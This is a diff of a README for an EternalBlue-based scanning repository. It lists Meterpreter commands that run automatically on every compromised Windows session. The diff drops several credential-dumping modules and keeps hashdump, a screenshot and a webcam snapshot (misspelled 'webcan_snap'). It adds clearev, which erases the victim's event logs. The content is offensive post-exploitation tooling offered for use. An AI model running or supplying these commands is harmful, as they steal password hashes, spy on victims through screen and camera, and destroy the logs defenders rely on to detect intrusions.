@@ -32,19 +32,10 @@ The **eternalscanner** repo is made for educational purposes only. It uses `eter
 If any sessions were opened this scripts automatically runs the following **meterpreter** commands from the *`assets/nsa.rc`* file. If you don't want to use following commands, you can just simply change the commands from that **`nsa.rc`** file.
 
 ```
-run post/windows/manage/priv_migrate
 hashdump
-load kiwi
-creds_all
-run post/windows/gather/lsa_secrets
-run post/windows/gather/cachedump
-load incognito
-list_tokens -u
 screenshot
-webcam_list
 webcan_snap -v false
-load mimikatz
-kerberos
+clearev
 background
 ```
 
